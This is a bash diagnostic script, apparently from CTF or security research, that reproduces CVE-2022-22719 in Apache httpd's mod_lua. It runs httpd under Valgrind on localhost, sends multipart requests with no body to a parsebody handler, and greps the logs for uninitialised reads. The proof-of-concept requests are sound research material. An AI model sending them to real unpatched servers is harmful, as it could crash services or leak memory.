#!/bin/bash
# 诊断 CVE-2022-22719：Valgrind memcheck 下发送 multipart + 无 body 请求
# 目的：确认 req_parsebody() 的 multipart 分支确实读取 lua_read_body 未初始化的 data/size
set -u
ROOT="/mnt/e/强网拟态/cve/apache"
RUN=/tmp/cve-2022-22719/vg
PREFIX=/opt/httpd
PORT=8095
CONF="$RUN/vg.conf"
rm -rf "$RUN"; mkdir -p "$RUN" "$PREFIX/lua"
cp -f "$ROOT/conf/lua/parsebody.lua" "$PREFIX/lua/parsebody.lua"
sed -e "s#/opt/httpd#${PREFIX}#g" -e "s#Listen 8095#Listen $PORT#" \
    -e "s#/tmp/cve-2022-22719#${RUN}#g" \
    "$ROOT/conf/CVE-2022-22719.conf" > "$CONF"
cd "$PREFIX"
valgrind --tool=memcheck --track-origins=yes --num-callers=30 \
         --log-file="$RUN/vg.%p.log" --error-limit=no \
         "$PREFIX/bin/httpd" -X -f "$CONF" > "$RUN/console.log" 2>&1 &
VPID=$!
echo "valgrind_pid=$VPID"
ok=0
for i in $(seq 1 120); do
  code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 2 "http://127.0.0.1:$PORT/" 2>/dev/null || true)
  if [ -n "$code" ] && [ "$code" != "000" ]; then ok=1; break; fi
  sleep 0.5
done
echo "server_ready=$ok"
if [ "$ok" != 1 ]; then tail -30 "$RUN/console.log"; kill $VPID 2>/dev/null; exit 2; fi

echo "=== GET multipart boundary, no body (vulnerable branch) ==="
curl -sS --max-time 20 -D "$RUN/resp_hdr.txt" -o "$RUN/resp_body.txt" \
  -H 'Content-Type: multipart/form-data; boundary=ABCXYZ' \
  "http://127.0.0.1:$PORT/parsebody" || true
cat "$RUN/resp_hdr.txt"; echo "body:"; cat "$RUN/resp_body.txt"; echo
sleep 2
echo "=== POST multipart boundary, Content-Length: 0 ==="
curl -sS --max-time 20 -D "$RUN/resp_hdr2.txt" -o "$RUN/resp_body2.txt" -X POST \
  -H 'Content-Type: multipart/form-data; boundary=ABCXYZ' -H 'Content-Length: 0' \
  "http://127.0.0.1:$PORT/parsebody" || true
cat "$RUN/resp_hdr2.txt"; echo "body:"; cat "$RUN/resp_body2.txt"; echo
sleep 3
kill $VPID 2>/dev/null; sleep 2; kill -9 $VPID 2>/dev/null
echo "=== valgrind logs ==="
ls -l "$RUN"/vg.*.log
for f in "$RUN"/vg.*.log; do
  echo "----- $f -----"
  grep -n -E 'uninitialised|Invalid read|ERROR SUMMARY|strstr|lua_read_body|req_parsebody' "$f" | head -60
done
